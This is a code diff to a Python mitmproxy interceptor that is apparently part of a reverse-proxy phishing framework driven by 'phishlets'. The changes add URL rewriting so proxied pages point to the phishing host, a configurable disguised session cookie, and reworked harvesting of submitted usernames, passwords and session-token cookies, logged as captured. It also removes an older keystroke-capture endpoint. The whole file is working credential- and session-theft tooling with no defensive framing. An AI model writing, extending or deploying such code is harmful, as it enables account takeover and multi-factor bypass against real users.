@@ -26,6 +26,7 @@ from core.edge.session import SessionManager
 from core.common import config
 from core.common.metrics import RATE_LIMITED, BLOCKED_IP
 from plugins.hook_system import trigger_hook, HookType, HookContext
+from core.malleable.profile import malleable_profile
 import time
 
 class VantaInterceptor:
@@ -38,6 +39,7 @@ class VantaInterceptor:
         self.allow_ips = set(config.get_list("ALLOW_IPS"))
         self.deny_ips = set(config.get_list("DENY_IPS"))
         self._buckets = {}  # ip -> [timestamps]
+        self.session_cookie_name = malleable_profile.get('storage_keys.session_cookie', 'vanta_sid')
 
     async def request(self, flow: http.HTTPFlow):
         """
@@ -93,8 +95,8 @@ class VantaInterceptor:
 
         # Session Identification
         session_id = None
-        if "vanta_sid" in flow.request.cookies:
-            session_id = flow.request.cookies["vanta_sid"]
+        if self.session_cookie_name in flow.request.cookies:
+            session_id = flow.request.cookies[self.session_cookie_name]
         else:
             # Create new session if landing
             import uuid
@@ -150,68 +152,9 @@ class VantaInterceptor:
         else:
             bucket.append(now)
         
-        # Internal Telemetry Endpoint (Behavioral Data)
-        if flow.request.path == "/__vanta_track":
-            try:
-                if flow.request.method == "POST":
-                    data = {}
-                    if hasattr(flow.request, "multipart_form") and flow.request.multipart_form:
-                        try:
-                            # Handle MultiDictView safely
-                            for key, val in flow.request.multipart_form.items(multi=True):
-                                k_str = key.decode() if isinstance(key, bytes) else key
-                                v_str = val.decode() if isinstance(val, bytes) else val
-                                data[k_str] = v_str
-                        except Exception:
-                            pass
-                    else:
-                        # Try form-urlencoded
-                        try:
-                            if hasattr(flow.request, "urlencoded_form") and flow.request.urlencoded_form:
-                                for key, val in flow.request.urlencoded_form.items(multi=True):
-                                    k_str = key.decode() if isinstance(key, bytes) else key
-                                    v_str = val.decode() if isinstance(val, bytes) else val
-                                    data[k_str] = v_str
-                        except Exception:
-                            pass
-                    
-                    if data:
-                        self.logger.info(f"Captured Behavior: {data}")
-                        # Store in session if possible
-                        # trigger hook
-                        ctx = HookContext(flow=flow, phishlet=self.phishlet)
-                        ctx.data = data
-                        await trigger_hook(HookType.BEHAVIOR_CAPTURED, ctx)
-                        
-                        # If keystrokes look like credentials, try to capture them
-                        if 'f' in data and 'k' in data:
-                            field = data['f']
-                            val = data['k']
-                            # Very basic heuristic for now
-                            if 'pass' in field.lower() or 'email' in field.lower() or 'user' in field.lower():
-                                # Capture as credential
-                                self.session_manager.capture_credential(
-                                    session_id=session_id,
-                                    username=val if 'user' in field.lower() or 'email' in field.lower() else "unknown",
-                                    password=val if 'pass' in field.lower() else "unknown",
-                                    url=flow.request.pretty_url
-                                )
-                                self.logger.info(f"Keystroke Credential: {field}={val}")
-
-                if hasattr(http, "Response"):
-                    resp = http.Response.make(200, b"OK", {"Access-Control-Allow-Origin": "*", "Content-Type": "text/plain"})
-                    # Ensure session cookie is set if this was a new session
-                    if session_id and flow.metadata.get("v_new_session"):
-                        # Use header directly to avoid mitmproxy cookie parsing issues
-                        resp.headers["Set-Cookie"] = f"vanta_sid={session_id}; Path=/"
-                    flow.response = resp
-                return
-            except Exception as e:
-                import traceback
-                self.logger.error(f"Telemetry error: {e}\n{traceback.format_exc()}")
-                if hasattr(http, "Response"):
-                    flow.response = http.Response.make(500, b"Error", {})
-                return
+        # Capture Credentials (POST)
+        if flow.request.method == "POST":
+            self._scan_for_credentials(flow)
 
         # TODO: Dynamic mapping based on loaded phishlet
         # For prototype, we assume the first proxy_host maps to target
@@ -418,8 +361,8 @@ class VantaInterceptor:
         try:
             new_sid = getattr(flow, "metadata", {}).get("v_new_session")
             if new_sid:
-                flow.response.headers.add("Set-Cookie", f"vanta_sid={new_sid}; Path=/")
-                # Avoid accessing flow.response.cookies directly if it causes issues
+                cookie_name = self.session_cookie_name
+                flow.response.headers.add("Set-Cookie", f"{cookie_name}={new_sid}; Path=/")
         except Exception:
             pass
 
@@ -521,9 +464,11 @@ class VantaInterceptor:
         # 2e. Apply sub_filters (Mirroring)
         self._apply_sub_filters(flow)
 
-        # 3. Inject Content
+        # 3. Rewrite Body Content (URLs, etc.) and Inject Scripts
         if flow.response.content:
+            self._rewrite_response_body(flow)
             self._inject_scripts(flow)
+        
         # 3b. CORS fallback patch
         try:
             req_origin = flow.request.headers.get("origin")
@@ -549,51 +494,97 @@ class VantaInterceptor:
         except Exception:
             pass
 
+    def _rewrite_response_body(self, flow: http.HTTPFlow):
+        """Rewrite URLs and other content in the response body."""
+        try:
+            content_type = flow.response.headers.get("content-type", "")
+            ph_host = getattr(flow, "metadata", {}).get("v_ph_host")
+            tgt_host = getattr(flow, "metadata", {}).get("v_tgt_host")
+
+            if not ph_host or not tgt_host or not flow.response.text:
+                return
+
+            # Only rewrite text-based content
+            if not any(mime in content_type for mime in ["html", "javascript", "json", "text"]):
+                return
+
+            # Perform URL rewriting
+            # This is a simplified version. A real implementation would be more robust.
+            # It should handle various URL formats (absolute, relative, protocol-relative)
+            # and be aware of the context (HTML attributes, JS strings, JSON values).
+            
+            # Replace target host with phishing host
+            # Ensure we don't accidentally replace parts of other words
+            # Use regex with word boundaries or lookarounds for more safety
+            
+            # Simple string replacement (less safe but good for a start)
+            flow.response.text = flow.response.text.replace(f"https://{tgt_host}", f"https://{ph_host}")
+            flow.response.text = flow.response.text.replace(f"http://{tgt_host}", f"https://{ph_host}")
+            flow.response.text = flow.response.text.replace(f"\\/\\/{tgt_host}", f"\\/\\/{ph_host}")
+
+            # More advanced rewriting could be added here, for example, using BeautifulSoup for HTML
+            # or a JS parser for JavaScript code.
+
+        except Exception as e:
+            self.logger.error(f"Error in _rewrite_response_body: {e}")
+
     def _scan_for_credentials(self, flow: http.HTTPFlow):
-        """Analyze POST body for defined credential fields"""
+        """Analyze POST body for defined credential fields based on phishlet configuration."""
         try:
             session_id = getattr(flow, "metadata", {}).get("v_session_id")
             if not session_id: return
 
-            content = flow.request.get_text(strict=False) if hasattr(flow.request, "get_text") else flow.request.text
-            
-            # Helper to extract value
-            def extract(regex, text):
-                m = re.search(regex, text)
-                return m.group(1) if m else None
+            # Check if the request path matches any credential capture paths
+            is_cred_submission = False
+            cred_paths = getattr(self.phishlet, "cred_paths", [])
+            if not cred_paths: # Fallback for older phishlet format
+                if hasattr(self.phishlet, 'credentials') and hasattr(self.phishlet.credentials, 'paths'):
+                    cred_paths = self.phishlet.credentials.paths
 
-            username = None
-            password = None
+            for cred_path in cred_paths:
+                if cred_path in flow.request.path:
+                    is_cred_submission = True
+                    break
             
-            for key, rule in self.phishlet.credentials.items():
-                if rule.type == "post_param" or rule.type == "post":
-                    # Regex for post param: key=value
-                    # Construct regex: (?:^|&)name=([^&]*)
-                    param_regex = rf"(?:^|&){re.escape(rule.key)}=([^&]*)"
-                    val = extract(param_regex, content)
-                    
-                    if val:
-                        import urllib.parse
-                        val = urllib.parse.unquote_plus(val)
-                        self.logger.info(f"Captured {key}: {val}")
-                        
-                        if key == "username" or key == "email":
-                            username = val
-                        elif key == "password":
-                            password = val
+            if not is_cred_submission:
+                return
 
-            if username or password:
+            self.logger.info(f"Potential credential submission to {flow.request.path}")
+            data = {}
+            try:
+                if hasattr(flow.request, "urlencoded_form") and flow.request.urlencoded_form:
+                    for key, val in flow.request.urlencoded_form.items(multi=True):
+                        data[key] = val
+            except Exception as e:
+                self.logger.error(f"Failed to parse form data for credential capture: {e}")
+
+            if not data:
+                return
+
+            # Extract username and password based on phishlet config
+            username = "N/A"
+            password = "N/A"
+
+            if hasattr(self.phishlet, 'credentials'):
+                if self.phishlet.credentials.username_field:
+                    username = data.get(self.phishlet.credentials.username_field, "N/A")
+                if self.phishlet.credentials.password_field:
+                    password = data.get(self.phishlet.credentials.password_field, "N/A")
+
+            if username != "N/A" or password != "N/A":
                 self.session_manager.capture_credential(
                     session_id=session_id,
-                    username=username or "unknown",
-                    password=password or "unknown",
+                    username=username,
+                    password=password,
                     url=flow.request.pretty_url
                 )
+                self.logger.critical(f"CAPTURED CREDENTIALS for session {session_id}: user='{username}'")
+
         except Exception as e:
-            self.logger.error(f"Error scanning credentials: {e}")
+            self.logger.error(f"Error in _scan_for_credentials: {e}")
 
     def _scan_for_tokens(self, flow: http.HTTPFlow):
-        """Analyze Set-Cookie headers for session tokens"""
+        """Analyze Set-Cookie headers for session tokens defined in the phishlet."""
         try:
             session_id = getattr(flow, "metadata", {}).get("v_session_id")
             if not session_id: return
@@ -602,17 +593,20 @@ class VantaInterceptor:
             for name, (value, attrs) in cookies.items():
                 # Check against phishlet auth_tokens rules
                 for rule in self.phishlet.auth_tokens:
-                    # rule is AuthToken or Dict (Pydantic model or dict)
-                    r_keys = getattr(rule, "keys", [])
-                    if isinstance(rule, dict):
-                         r_keys = rule.get("keys", [])
-
-                    # If rule has keys list, check if name is in keys
-                    if name in r_keys:
+                    # The rule can be a simple string (cookie name) or a more complex object
+                    token_name_to_check = None
+                    if isinstance(rule, str):
+                        token_name_to_check = rule
+                    elif hasattr(rule, 'name'):
+                        token_name_to_check = rule.name
+                    
+                    if token_name_to_check and name == token_name_to_check:
+                        self.logger.critical(f"CAPTURED SESSION TOKEN for session {session_id}: {name}={value[:30]}...")
                         self.session_manager.capture_token(session_id, name, value)
+                        break # Move to the next cookie
                         
         except Exception as e:
-            self.logger.error(f"Error scanning tokens: {e}")
+            self.logger.error(f"Error in _scan_for_tokens: {e}")
 
     def _apply_sub_filters(self, flow: http.HTTPFlow):
         """Apply string replacements on response body based on sub_filters"""
